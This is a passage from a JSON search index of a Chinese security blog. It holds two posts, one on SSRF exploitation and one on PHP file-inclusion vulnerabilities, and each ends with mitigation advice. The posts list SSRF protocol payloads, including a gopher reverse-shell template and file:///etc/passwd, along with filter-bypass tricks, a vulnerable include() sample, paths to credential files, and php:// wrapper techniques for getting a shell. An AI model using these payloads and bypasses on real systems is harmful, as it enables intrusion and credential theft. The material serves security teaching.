always）\n\n\nSSRF漏洞利用\ndict协议,操作redis服务,例如:dict://127.0.0.1:6379/info\n\nfile协议,任意文件读取,例如:file:///etc/passwd\n\ngopher,反弹shell,例如gopher://127.0.0.1:6379/xxxxxxx\n\nhttp,结合burpsuite探测内网存活主机\n\n\nSSRF利用小技巧\nhttp://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的\n\n各种IP地址的进制转换\n\nURL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/\n\n短网址绕过 http://t.cn/RwbLKDx\n\nxip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意,利用重定向）\n\n限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80\n\n例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，但这样可以用 http://abc@10.153.138.81/ 绕过\n\n\nSSRF如何防护\n黑名单\n过滤10.0.0.0/8 、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址\n过滤file:///、dict://、gopher://、ftp:// 危险协议\n对返回的内容进行识别\n\n\n白名单\n使用地址白名单\n对返回内容进行识别\n需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：首先禁用 CURLOPT_FOLLOWLOCATION；然后通过域名获取目标ip，并过滤内部ip；最后识别返回的内容是否与假定内容一致\n\n\n\n","categories":["漏洞总结"],"tags":["SSRF"]},{"title":"浅析文件包含漏洞","url":"http://example.com/2021/01/26/浅析文件包含漏洞/","content":"文件包含漏洞什么是文件包含​        程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。\n​        简单来说就是为了增加代码的复用性,将重复使用的代码写入一个文件后,通过文件包含函数,在一个文件中包含另一个文件。\n文件包含漏洞形成的原因。​        随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码，就造成了文件包含漏洞。\n示例：\n​            \n&lt;?php    $filename  = $_GET[&#x27;filename&#x27;];    include($filename);?&gt;\n\n$_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改\n$_GET[&#39;filename&#39;]的值，执行非预期的操作。\n文件包含漏洞所使用的函数\ninclude( )当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。\n\ninclude_once( )功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次\n\nrequire( )require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。\n\nrequire_once( )功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。\n\n\n当出现上述四个函数是,就可能出现文件包含漏洞\n文件包含漏洞的危害\n读取本地文件,获取主机上的敏感信息。例如：配置文件，日志，密码\n\n常见的敏感信息路径：\nWindows系统\n\nc:\\boot.ini // 查看系统版本\nc:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件\nc:\\windows\\repair\\sam // 存储Windows系统初次安装的密码\nc:\\ProgramFiles\\mysql\\my.ini // MySQL配置\nc:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码\nc:\\windows\\php.ini // php 配置信息\n\nLinux/Unix系统\n\n/etc/passwd // 账户信息\n/etc/shadow // 账户密码文件\n/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置\n/usr/local/app/php5/lib/php.ini // PHP相关配置\n/etc/httpd/conf/httpd.conf // Apache配置文件\n/etc/my.conf // mysql 配置文件\n\n\n\n\n远程文件包含：攻击者访问玩不地址来加载远程的代码，需要php.ini中allow_url_fopen和allow_url_include要为On。而且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是php)\n\n可以包含木马文件进行getshell\n\n\n\n文件包含漏洞的利用\n读取本地文件\n\n \n\n\n  在同级目录下创建index.php和flag.php两个文件\n  \n\n可以读取flag.php文件里面的内容\n\n远程文件包含:包含远程文件地址中的木马,使用蚁剑等工具进行连接\n\n文件包含漏洞的小技巧\n大小写绕过\n文件后加入特殊字符绕过利用工具，将访问路径后加入%00，可以绕过后缀检查。或者后面加一些特殊字符例如 斜杠 点之类。\n省略后缀有些程序会将传入参数指引到其他位置，或者修改后缀名，先访问文件判断，例如不需要写后缀名。\n双写绕过当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php”，”…/“，只需再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。\nnginx目录解析漏洞当判断到中间件是nginx时，我们可以利用nginx目录解析，当我们只能上传.jpg文件时，我们无法利用，只能原文读取出来，但是发现在shell.jpg后加/xxx.php,他就能以php方式读取文件，这就是目录解析漏洞。\n包含日志文件\n伪协议包含当不能直接访问目录下文件时，可以选择利用伪协议来访问文件，伪协议有以下几种：（allow_url_fopen和allow_url_include）都为On（1）page=file://[绝对路径]当页面有file1，file2……后台会判断是否已file开头，我们可以使用此协议。（2）php:// 访问各个输入/输出流（I/O streams）php://filter用于读取源码php://input用于执行php代码，或者直接将代码写入执行。（3）zip://[绝对路径], bzip2://[绝对路径], zlib://[绝对路径]协议，都属于压缩楼，访问压缩文件中的子文件，不需要指定后缀phar:// 可以查找指定压缩包内的文件，相对路径与绝对路径都可以写（4）data: text/plain,与input类似，当我们想查看源代码时，可以将其先转换为base64文件在传到页面上就不会执行PHP了（5）http协议也可以传入外部链接，自己服务器的钓鱼网站。\n\n文件包含漏洞如何防护\n\n\n设置白名单\n代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。\n\n\n\n过滤危险字符\n由于Include/Require可以对PHP Wrapper形式的地址进行包含执行（需要配置php.ini），在Linux环境中可以通过”../../”的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。\n\n\n设置文件目录\nPHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。\n\n\n关闭危险配置\nPHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。\n\n\n","categories":["漏洞总结"],"tags":["文件包含"]}]